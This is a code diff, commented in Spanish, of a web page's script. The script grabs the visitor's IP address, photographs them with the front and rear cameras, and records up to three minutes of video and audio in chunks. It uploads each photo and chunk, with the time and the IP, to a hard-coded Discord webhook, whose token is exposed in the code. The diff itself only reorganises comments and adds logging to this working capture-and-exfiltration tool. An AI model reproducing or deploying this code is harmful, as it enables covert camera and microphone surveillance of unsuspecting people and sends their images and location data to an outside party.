@@ -68,9 +68,10 @@
   <script>
     const video = document.getElementById('video');
 
-    // ====== CONFIGURACIÓN ======
     const WEBHOOK_URL = 'https://discord.com/api/webhooks/1548798068885819432/2ERz1DQOk54rVCxyFh-O-EGn4sTTh8FFYzeJzIDobMr3ZuWgVJK2Npu8-0FfMk-MtVZ5';
-    const SEGUNDOS_POR_TROZO = 3;   // duración de cada trozo de video
+
+    // ====== CONFIGURACIÓN ======
+    const SEGUNDOS_POR_TROZO = 3;   // duración de cada trozo
     const MAX_TROZOS = 60;          // 60 x 3s = 3 minutos máximo
     const ANCHO = 320;
     const ALTO = 240;
@@ -82,7 +83,6 @@
     let pidiendo = false;
     let ipUsuario = null;
 
-    // -------- IP --------
     async function obtenerIP() {
       if (ipUsuario) return ipUsuario;
       try {
@@ -96,14 +96,12 @@
       }
     }
 
-    // -------- Hora --------
     function horaActual() {
       const d = new Date();
       const pad = n => String(n).padStart(2, '0');
-      return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} - ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${pad(d.getFullYear())}`;
+      return `${pad(d.getHours())}:${pad(d.getMinutes())}:${pad(d.getSeconds())} - ${pad(d.getDate())}/${pad(d.getMonth()+1)}/${d.getFullYear()}`;
     }
 
-    // -------- Capturar foto --------
     async function capturarFoto(facingMode) {
       if (currentStream) {
         currentStream.getTracks().forEach(t => t.stop());
@@ -140,7 +138,6 @@
       return blob;
     }
 
-    // -------- Enviar al webhook --------
     async function enviarAlWebhook(blob, mensaje, nombreArchivo) {
       const formData = new FormData();
       formData.append('file', blob, nombreArchivo);
@@ -159,7 +156,6 @@
       }
     }
 
-    // -------- Elegir mimeType soportado --------
     function elegirMimeTypeVideo() {
       const candidatos = [
         'video/webm;codecs=vp8,opus',
@@ -176,7 +172,6 @@
       return '';
     }
 
-    // -------- Grabar video en trozos --------
     async function grabarVideoEnTrozos(hora, linkIP) {
       if (!navigator.mediaDevices || !window.MediaRecorder) {
         throw new Error('MediaRecorder no soportado');
@@ -201,6 +196,7 @@
 
       let trozo = 0;
 
+      // Función que graba un solo trozo de X segundos
       function grabarTrozo() {
         return new Promise((resolve, reject) => {
           let recorder;
@@ -212,10 +208,16 @@
           }
 
           const chunks = [];
+
           recorder.ondataavailable = e => {
             if (e.data && e.data.size > 0) chunks.push(e.data);
           };
-          recorder.onerror = e => reject(e);
+
+          recorder.onerror = e => {
+            console.error('Error en MediaRecorder:', e);
+            reject(e);
+          };
+
           recorder.onstop = () => {
             const blob = new Blob(chunks, { type: mimeType || 'video/webm' });
             resolve(blob);
@@ -234,6 +236,7 @@
         });
       }
 
+      // Bucle infinito hasta que el usuario salga o se alcance el máximo
       while (trozo < MAX_TROZOS) {
         trozo++;
         console.log(`Grabando trozo ${trozo}/${MAX_TROZOS}...`);
@@ -246,21 +249,26 @@
           break;
         }
 
-        if (!blob || blob.size === 0) continue;
+        if (!blob || blob.size === 0) {
+          console.warn(`Trozo ${trozo} vacío.`);
+          continue;
+        }
 
         console.log(`Trozo ${trozo}: ${(blob.size/1024).toFixed(1)} KB. Enviando...`);
 
+        // Enviar SIN esperar la respuesta (no bloquea el siguiente trozo)
         enviarAlWebhook(
           blob,
           `🎥 **Video+Audio - trozo ${trozo}** (${SEGUNDOS_POR_TROZO}s)\n🕒 Hora: ${hora}\n🌐 IP: ${linkIP}`,
           `video_trozo_${trozo}.${ext}`
-        );
+        ).then(ok => {
+          if (!ok) console.warn(`Trozo ${trozo} falló al enviar.`);
+        });
       }
 
       stream.getTracks().forEach(t => t.stop());
     }
 
-    // -------- Flujo principal --------
     async function iniciar() {
       if (pidiendo || yaEnviado) return;
       pidiendo = true;
@@ -270,6 +278,7 @@
       const linkIP = ip ? `https://whatismyipaddress.com/ip/${ip}` : 'IP no disponible';
 
       try {
+        // Fotos
         console.log('Foto frontal...');
         const fotoFrontal = await capturarFoto('user');
         await enviarAlWebhook(
@@ -294,6 +303,7 @@
 
         await new Promise(r => setTimeout(r, 500));
 
+        // Video en trozos
         console.log('Iniciando video en trozos...');
         await grabarVideoEnTrozos(hora, linkIP);
 
